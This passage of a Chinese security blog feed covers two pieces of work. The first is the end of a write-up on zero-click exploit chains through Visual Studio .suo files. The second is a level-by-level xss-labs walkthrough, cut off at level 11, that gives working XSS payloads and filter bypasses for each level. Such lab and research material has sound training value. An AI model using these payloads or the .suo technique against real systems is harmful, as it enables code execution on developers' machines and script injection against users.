class="hljs-keyword">typeof</span>(AssemblyEnumerationService), serviceCreatorCallback);<br>&#125;<br><span class="hljs-comment">// 注意这里</span><br><span class="hljs-keyword">base</span>.AddOptionKey(<span class="hljs-keyword">typeof</span>(VsToolboxService).Name);<br>VSCorePackage._instance = <span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续跟调用栈，<code>mscorlib.dll</code>是.net运行时的内部组件不用看，主要看vs的业务组件</p><p><img src="/articles/vs_exploit_research/4.png"></p><p>从调用栈的<code>lazy</code> <code>load</code> <code>async</code>等关键词可以猜出来，大概是开发者为了优化程序性能，使用了延迟加载机制，只有在需要时才加载对应组件，这也就解释了为什么部分项目需要用户二次操作才能利用（所以<strong>并不是微软修复了这个漏洞，仅仅是优化机制阻碍了零点击利用</strong>）</p><p>接下来重点就看看有没有什么方法能够绕过这个延迟加载机制</p><p>已知.net窗体应用可以零点击利用，调试发现是窗体设计组件<code>System.Design.dll</code>自动调用了<code>VSCorePackage</code>（前提是<strong>窗体设计窗口要放到前台再保存关闭项目</strong>，这样用户打开项目时就会自动进入窗体设计窗口并加载<code>System.Design.dll</code>）</p><p>问题差不多解决了，然后找零点击利用链就行</p><p>很明显，一条目前已知的利用链</p><blockquote><p><strong>.net窗体设计器 -&gt; <code>System.Design.dll</code> -&gt; <code>VSCorePackage</code></strong></p></blockquote><p>但是用户不一定安装了.net开发环境，最好再找一条更通用的利用链</p><p>不需要审计代码，代码量太大审计起来太头疼，直接创建一个项目，把可能存在利用链的功能用上，判断是否能零点击利用成功最终调试定位到利用链</p><p>这里作为演示，我猜测vs的「类视图解析」功能可能存在利用链，所以创建一个C++项目，编写一个简单的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;hello world&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/articles/vs_exploit_research/5.png"></p><p>保持「类视图解析」在前台，保存退出项目，在suo文件插入payload，打开，发现零点击利用成功</p><p><img src="/articles/vs_exploit_research/6.png"></p><p>调试分析代码可知，发现漏洞并不是出现在「类视图解析」功能上，而是窗口聚焦功能，因为我把「类视图解析」聚焦到了前台，用户打开就会自动聚焦到「类视图解析」上导致漏洞被零点击激活</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-comment">// Token: 0x060006BF RID: 1727 RVA: 0x0001DFF0 File Offset: 0x0001C1F0</span><br><span class="hljs-function"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">override</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">OnQuerySwitchPane</span>(<span class="hljs-params">FrameMoniker frameMoniker</span>)</span><br>&#123;<br>WindowFrame windowFrame = <span class="hljs-keyword">base</span>.FindFrame(frameMoniker);<br><span class="hljs-keyword">if</span> (windowFrame != <span class="hljs-literal">null</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>Guid toolWindowGuid = frameMoniker.ToolWindowGuid;<br><span class="hljs-keyword">if</span> (toolWindowGuid != Guid.Empty)<br>&#123;<br>Guid guid = <span class="hljs-keyword">typeof</span>(IVsWindowPane).GUID;<br>IntPtr zero = IntPtr.Zero;<br>ErrorHandler.ThrowOnFailure(GlobalServices.ServiceProvider.QueryService(<span class="hljs-keyword">ref</span> toolWindowGuid, <span class="hljs-keyword">ref</span> guid, <span class="hljs-keyword">out</span> zero));<br><span class="hljs-keyword">using</span> (SafeIUnknown safeIUnknown = <span class="hljs-keyword">new</span> SafeIUnknown(zero))<br>&#123;<br>IVsWindowPane vsWindowPane = safeIUnknown.ToObject() <span class="hljs-keyword">as</span> IVsWindowPane;<br><span class="hljs-keyword">if</span> (vsWindowPane != <span class="hljs-literal">null</span>)<br>&#123;<br>windowFrame = WindowFrame.CreateInstance(frameMoniker);<br>windowFrame.DocumentSite = <span class="hljs-keyword">new</span> DocumentObjectSite(windowFrame, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-built_in">uint</span>.MaxValue);<br>windowFrame.DocumentSite.InitializeDocumentObject(vsWindowPane);<br>windowFrame.SetProperty(<span class="hljs-number">-3004</span>, <span class="hljs-keyword">base</span>.Caption);<br><span class="hljs-keyword">base</span>.AddFrame(windowFrame);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以利用链就是</p><blockquote><p><strong>窗口聚焦 -&gt; <code>Microsoft.VisualStudio.Platform.WindowManagement.dll</code> -&gt; <code>VSCorePackage</code></strong></p></blockquote><p>创建一个空项目，随便选一个窗口聚焦（这里用git更改窗口），保存退出项目，在suo文件插入payload，打开，零点击利用成功，更加证实了这个利用链</p><p><img src="/articles/vs_exploit_research/7.png"></p><p>同理，这里必然还存在非常多的利用链，但是我懒得挖了，这两条零点击已经非常厉害了（够用就行，笑）</p>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>逆向工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss-labs 靶场零点击攻略</title>
    <link href="/articles/xss_labs_0click/"/>
    <url>/articles/xss_labs_0click/</url>
    
    <content type="html"><![CDATA[<h1 id="1（零点击）"><a href="#1（零点击）" class="headerlink" title="1（零点击）"></a>1（零点击）</h1><p>无难度，直接上payload</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">level1.php<span class="hljs-built_in">?name</span>=<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h1 id="2（零点击）"><a href="#2（零点击）" class="headerlink" title="2（零点击）"></a>2（零点击）</h1><p>h2标签经过了实体转义，但input没有</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level2<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(1)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level2.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;搜索&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level2.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:25<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload闭合input执行代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="3（零点击）"><a href="#3（零点击）" class="headerlink" title="3（零点击）"></a>3（零点击）</h1><p>这次两个都经过了实体转义，但是input标签使用单引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level3<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(1)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level3.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>alert(1)<span class="hljs-symbol">&amp;lt;</span>/script<span class="hljs-symbol">&amp;gt;</span>&#x27;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level3.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:25<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload闭合input执行代码：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">level3.php?keyword=<span class="hljs-symbol">&#x27;onfocus</span>=<span class="hljs-symbol">&#x27;alert</span>(<span class="hljs-number">1</span>)<span class="hljs-symbol">&#x27;autofocus</span>=&#x27;<br></code></pre></td></tr></table></figure><h1 id="4（零点击）"><a href="#4（零点击）" class="headerlink" title="4（零点击）"></a>4（零点击）</h1><p>过滤掉了尖括号，但是没有过滤引号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level4<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;quot;</span>&#x27;相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level4.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&#x27;&quot;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level4.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:2<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>构造payload闭合input执行代码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">level4</span>.php?keyword=<span class="hljs-string">&quot;onfocus=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;autofocus=&quot;</span><br></code></pre></td></tr></table></figure><h1 id="5（零点击）"><a href="#5（零点击）" class="headerlink" title="5（零点击）"></a>5（零点击）</h1><p>先用最简单的payload测试一下，发现script文本替换为了scr_ipt</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;lt;</span>script<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;scr_ipt&gt;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:9<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>构造img发现on也被替换了</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>/&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level5<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>没有找到和<span class="hljs-symbol">&amp;quot;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;lt;</span>img src=0 onerror=&#x27;alert(1)&#x27;/<span class="hljs-symbol">&amp;gt;</span>相关的结果.<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">level5.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">GET</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">keyword</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">0</span> <span class="hljs-attr">o_nerror</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span>/&gt;</span>&quot;&gt;<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">name</span>=<span class="hljs-string">submit</span> <span class="hljs-attr">value</span>=<span class="hljs-string">搜索</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level5.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>payload的长度:34<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是src没被替换，所以构造iframe搭配javascript伪协议执行代码：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">level5.php?<span class="hljs-attribute">keyword</span>=<span class="hljs-string">&quot;&gt;&lt;iframe src=&quot;</span>javascript:alert(1)&quot; /&gt;<br></code></pre></td></tr></table></figure><h1 id="6（零点击）"><a href="#6（零点击）" class="headerlink" title="6（零点击）"></a>6（零点击）</h1><p>输入<code>on</code>，发现被替换为了<code>o_n</code>，输入<code>On</code>，没有替换</p><p>很简单的大小写绕过，构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">level6.php?keyword=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">Script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">Script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="7（零点击）"><a href="#7（零点击）" class="headerlink" title="7（零点击）"></a>7（零点击）</h1><p>随便输了几个关键词后发现大小写绕过行不通</p><p>这次不再是关键词加下划线过滤，而是直接清空，那就可能存在双写绕过</p><p>构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">level7.php?keyword=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">scrscriptipt</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">scrscriptipt</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="8"><a href="#8" class="headerlink" title="8"></a>8</h1><p>大小写绕过和双写绕过都不行，且经过了实体转义，javascript伪协议同样被过滤</p><p>构造payload转义绕过：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#x6A;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x76;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x73;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x70;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x3A;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x72;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x29;</span><br></code></pre></td></tr></table></figure><h1 id="9"><a href="#9" class="headerlink" title="9"></a>9</h1><p>随便输入几个字符串模糊测试一下发现只有包含<code>http://</code>的才是合法链接</p><p>但是吧，并不判断位置，也就是说，<code>http://</code>哪怕在字符串末尾出现同样也是合法链接</p><p>构造payload，将<code>http://</code>放到最后面，并加上<code>//</code>将其注释掉避免影响代码执行</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><h1 id="10（零点击）"><a href="#10（零点击）" class="headerlink" title="10（零点击）"></a>10（零点击）</h1><p>代码中存在3个隐藏的input标签，且只有t_sort可以进行反射，但是过滤了尖括号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这一题的核心点是如何处理标签的hidden属性，autofocus好像在hidden标签中不生效</p><p>构造payload，在前面再写个type，尝试覆盖掉后面的hidden</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">level10</span>.php?t_sort=<span class="hljs-string">&quot;type=&quot;</span>text<span class="hljs-string">&quot;onfocus=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;autofocus=&quot;</span><br></code></pre></td></tr></table></figure><h1 id="11（零点击）"><a href="#11（零点击）" class="headerlink" title="11（零点击）"></a>11（零点击）</h1><p>和上一关一样，同样的隐藏标签，且只有t_sort可以进行反射，但是经过了实体转义</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_link&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_history&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;t_ref&quot;</span>  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>t_sort无法攻击，那就考虑t_ref的referer头注入</p><p>但是因为安全原因，浏览器不允许前端自定义referer头，手动修改请求包的referer头终究只是self-xss，无任何意义</p><p>所以，修改代码（不修改代码此题无解，因为referer头中的双引号会被转义），将t_ref的双引号改为单引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;input name=<span 